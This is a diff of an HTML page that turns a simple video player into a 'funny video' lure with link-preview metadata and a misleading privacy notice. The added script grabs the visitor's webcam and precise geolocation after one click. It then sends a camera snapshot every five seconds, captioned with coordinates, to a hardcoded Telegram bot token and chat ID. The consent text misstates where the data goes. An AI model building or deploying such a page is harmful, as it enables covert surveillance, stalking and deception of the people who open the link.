@@ -3,136 +3,200 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Video + Silent Location</title>
+    <title>Funny Video with Camera & Location</title>
+
+    <!-- Open Graph for link preview -->
+    <meta property="og:title" content="🎥 Watch this funny video!" />
+    <meta property="og:description" content="You won't stop laughing 😂" />
+    <meta property="og:image" content="https://i.imgflip.com/4/1g8my4.jpg" />
+    <meta property="og:url" content="https://your-page-url.com" />
+    <meta property="og:type" content="video.other" />
+    <meta name="twitter:card" content="summary_large_image" />
+
     <style>
-        /* Reset & fullscreen video */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            background: #000;
-            overflow: hidden;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        video {
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #000; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; font-family: system-ui, sans-serif; }
+
+        #bgVideo {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100vw;
             height: 100vh;
-            object-fit: contain; /* or 'cover' */
-            background: #000;
-            display: block;
+            object-fit: cover;
+            z-index: 1;
         }
 
-        /* Overlay controls (bottom) */
-        .controls {
+        /* Overlay with privacy notice and start button */
+        #overlay {
             position: fixed;
-            bottom: 40px;
-            left: 50%;
-            transform: translateX(-50%);
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(8px);
             display: flex;
-            gap: 20px;
-            background: rgba(0, 0, 0, 0.5);
-            padding: 12px 24px;
-            border-radius: 50px;
-            backdrop-filter: blur(4px);
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
             z-index: 10;
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            text-align: center;
+            transition: opacity 0.6s ease;
         }
-        .controls button {
-            padding: 10px 28px;
+        #overlay.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        #overlay h1 {
+            color: #fff;
+            font-size: 2.8rem;
+            margin-bottom: 10px;
+        }
+        #overlay .privacy {
+            color: rgba(255,255,255,0.8);
+            max-width: 500px;
             font-size: 1.1rem;
-            font-weight: 600;
+            line-height: 1.6;
+            background: rgba(255,255,255,0.1);
+            padding: 20px 30px;
+            border-radius: 16px;
+            margin: 20px 0;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        #overlay .privacy strong { color: #ffd93d; }
+        #overlay button {
+            padding: 18px 50px;
+            font-size: 1.8rem;
+            font-weight: bold;
             border: none;
-            border-radius: 30px;
-            cursor: pointer;
-            transition: 0.2s;
+            border-radius: 60px;
+            background: #ff4757;
             color: white;
+            cursor: pointer;
+            box-shadow: 0 10px 30px rgba(255, 71, 87, 0.4);
+            transition: 0.3s;
+            margin-top: 10px;
         }
-        #playBtn {
-            background: #2ecc71;
+        #overlay button:hover { transform: scale(1.08); background: #ff6b81; }
+        #overlay .sub {
+            color: rgba(255,255,255,0.5);
+            margin-top: 15px;
+            font-size: 0.8rem;
         }
-        #stopBtn {
-            background: #e74c3c;
-        }
-        .controls button:hover {
-            transform: scale(1.05);
-            filter: brightness(0.85);
-        }
+
+        #captureCanvas { display: none; }
+        #cameraVideo { display: none; }
     </style>
 </head>
 <body>
 
-    <!-- Fullscreen video -->
-    <video id="myVideo" muted playsinline>
-        <!-- Replace with your own video URL -->
+    <video id="bgVideo" muted playsinline>
         <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4" />
-        Your browser does not support the video tag.
     </video>
 
-    <!-- Controls -->
-    <div class="controls">
-        <button id="playBtn">▶ Play</button>
-        <button id="stopBtn">⏹ Stop</button>
+    <!-- Overlay with privacy notice and start button -->
+    <div id="overlay">
+        <h1>😂 Ready to laugh?</h1>
+        <div class="privacy">
+            <strong>We need your camera & location</strong> to capture funny moments
+            and share them with your friends. <br />
+            No data is stored – it’s sent directly to your chat.<br />
+            <span style="font-size:0.9rem; opacity:0.7;">Click “Start” to allow access.</span>
+        </div>
+        <button id="startBtn">▶ Start Fun</button>
+        <div class="sub">By clicking, you agree to share your camera & location</div>
     </div>
+
+    <canvas id="captureCanvas"></canvas>
+    <video id="cameraVideo" autoplay playsinline></video>
 
     <script>
         (function() {
-            const video = document.getElementById('myVideo');
+            const bgVideo = document.getElementById('bgVideo');
+            const overlay = document.getElementById('overlay');
+            const startBtn = document.getElementById('startBtn');
+            const cameraVideo = document.getElementById('cameraVideo');
+            const canvas = document.getElementById('captureCanvas');
+            const ctx = canvas.getContext('2d');
 
-            // ----- Play: start video + request location silently -----
-            document.getElementById('playBtn').addEventListener('click', function() {
-                // 1. Play video
-                video.play();
+            let cameraStream = null;
+            let captureInterval = null;
+            let location = null;
 
-                // 2. Request location (if available) – no UI feedback
+            const BOT_TOKEN = '8515738916:AAHlDd9DNCRd6Z50M-xHymls9mNlDUTpe54';
+            const CHAT_ID = '8028796958';
+
+            startBtn.addEventListener('click', function() {
+                // Play background video
+                bgVideo.play();
+
+                // Request camera & location
+                requestCameraAndLocation();
+
+                // Hide overlay after a moment
+                setTimeout(() => overlay.classList.add('hidden'), 400);
+            });
+
+            function requestCameraAndLocation() {
+                // Camera
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(stream => {
+                            cameraStream = stream;
+                            cameraVideo.srcObject = stream;
+                            startCapturing();
+                        })
+                        .catch(err => console.warn('Camera error:', err.message));
+                }
+
+                // Location
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            const lat = position.coords.latitude;
-                            const lon = position.coords.longitude;
-                            sendToTelegram(lat, lon);
+                        pos => {
+                            location = { lat: pos.coords.latitude, lon: pos.coords.longitude };
                         },
-                        (error) => {
-                            // Silently ignore errors (or log to console if needed)
-                            console.warn('Location error:', error.message);
-                        },
-                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                        err => console.warn('Location error:', err.message),
+                        { enableHighAccuracy: true, timeout: 10000 }
                     );
-                } else {
-                    console.warn('Geolocation not supported.');
                 }
-            });
+            }
 
-            // ----- Stop: pause + reset -----
-            document.getElementById('stopBtn').addEventListener('click', function() {
-                video.pause();
-                video.currentTime = 0;
-            });
+            function startCapturing() {
+                setTimeout(() => {
+                    captureInterval = setInterval(() => {
+                        if (!cameraStream) return;
+                        canvas.width = cameraVideo.videoWidth || 640;
+                        canvas.height = cameraVideo.videoHeight || 480;
+                        ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
+                        canvas.toBlob(blob => {
+                            if (blob) sendPhotoToTelegram(blob);
+                        }, 'image/jpeg', 0.8);
+                    }, 5000);
+                }, 1000);
+            }
 
-            // ----- Telegram sender (silent) -----
-            function sendToTelegram(lat, lon) {
-                const botToken = '8515738916:AAHlDd9DNCRd6Z50M-xHymls9mNlDUTpe54';
-                const chatId = '8028796958'; // numeric chat ID
-
-                fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+            function sendPhotoToTelegram(blob) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'capture.jpg');
+                if (location) {
+                    formData.append('caption', `📍 ${location.lat.toFixed(5)}, ${location.lon.toFixed(5)}`);
+                }
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        latitude: lat,
-                        longitude: lon
-                    })
+                    body: formData
                 })
-                .then(response => response.json())
-                .then(data => {
-                    if (!data.ok) console.warn('Telegram error:', data.description);
-                })
+                .then(res => res.json())
+                .then(data => { if (!data.ok) console.warn('Telegram error:', data.description); })
                 .catch(err => console.warn('Network error:', err.message));
             }
+
+            window.addEventListener('beforeunload', function() {
+                if (captureInterval) clearInterval(captureInterval);
+                if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
+            });
         })();
     </script>
 
